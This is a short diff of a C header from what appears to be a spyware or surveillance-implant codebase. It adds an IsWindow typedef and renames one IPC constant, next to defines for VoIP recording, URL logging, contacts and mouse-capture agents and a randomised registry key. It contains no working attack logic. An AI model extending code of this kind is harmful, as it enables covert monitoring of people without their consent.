@@ -30,6 +30,7 @@ typedef BOOL		(__stdcall *FreeLibrary_t) (HMODULE);
 typedef FARPROC		(__stdcall *GetProcAddress_t) (HMODULE, char *);
 typedef HINSTANCE	(__stdcall *LoadLibrary_t) (WCHAR *);
 typedef DWORD		(__stdcall *GetCurrentProcessId_t) (void);
+typedef BOOL		(__stdcall *IsWindow_t) (HWND);
 typedef BOOL		(__stdcall *IsWow64Process_t) (HANDLE InProc, BOOL *OutResult);
 
 extern BOOL FindModulePath(WCHAR *path_buf, DWORD path_size);
@@ -52,7 +53,7 @@ extern WCHAR g_registry_key_name[MAX_RAND_NAME];
 #define PM_PRINTAGENT (WR_HIDE_CON + WRAPPER_MAX_SHARED_MEM)   // 0x0100
 #define PM_VOIPRECORDAGENT (PM_PRINTAGENT + WRAPPER_MAX_SHARED_MEM) // 0x0140
 #define PM_URLLOG (PM_VOIPRECORDAGENT + WRAPPER_MAX_SHARED_MEM)     // 0x0180
-#define PM_SNAPSHOTAGENT_IPC (PM_URLLOG + WRAPPER_MAX_SHARED_MEM)   // 0x01C0
+#define PM_ONNEWWINDOW_IPC (PM_URLLOG + WRAPPER_MAX_SHARED_MEM)   // 0x01C0
 #define PM_CONTACTSAGENT      0x0200
 #define PM_DEVICEINFO         0x0240
 #define PM_MOUSEAGENT         0x0280
